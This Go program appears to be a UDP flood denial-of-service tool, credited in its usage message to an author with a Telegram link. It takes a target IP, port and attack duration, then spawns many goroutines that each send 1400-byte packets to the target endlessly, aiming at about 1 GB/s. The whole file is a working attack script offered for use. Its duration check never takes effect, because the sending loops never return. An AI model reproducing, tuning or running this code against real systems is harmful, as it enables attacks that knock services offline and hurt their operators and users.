package main

import (
 "fmt"
 "net"
 "os"
 "strconv"
 "sync"
 "time"
)

func main() {
 if len(os.Args) != 4 {
  fmt.Println("Usage: go run UDP.go <target_ip> <target_port> <attack_duration>               CODE MADE BY NEXION               https://t.me/NEXION_GAMEING")
  return
 }

 targetIP := os.Args[1]
 targetPort := os.Args[2]
 duration, err := strconv.Atoi(os.Args[3])
 if err != nil {
  fmt.Println("Invalid attack duration:", err)
  return
 }

 // Calculate the number of packets needed to achieve 1GB/s traffic
 packetSize := 1400 // Adjust packet size as needed
 packetsPerSecond := 1_000_000_000 / packetSize
 numThreads := packetsPerSecond / 23_000

 // Create wait group to ensure all goroutines finish before exiting
 var wg sync.WaitGroup

 // Loop to continuously send UDP packets
 for {
  select {
  case <-time.After(time.Duration(duration) * time.Second):
   fmt.Println("Attack finished.")
   os.Exit(0)
  default:
   // Launch goroutine for each thread
   for i := 0; i < numThreads; i++ {
    wg.Add(1)
    go func() {
     defer wg.Done()
     sendUDPPackets(targetIP, targetPort, packetsPerSecond)
    }()
   }
   wg.Wait()
  }
 }
}

func sendUDPPackets(ip, port string, packetsPerSecond int) {
 conn, err := net.Dial("udp", fmt.Sprintf("%s:%s", ip, port))
 if err != nil {
  fmt.Println("Error connecting:", err)
  return
 }
 defer conn.Close()

 // Generate and send UDP packets continuously
 packet := make([]byte, 1400) // Adjust packet size as needed
 for {
  for i := 0; i < packetsPerSecond; i++ {
   _, err := conn.Write(packet)
   if err != nil {
    fmt.Println("Error sending UDP packet:", err)
    return
   }
  }
 }
}
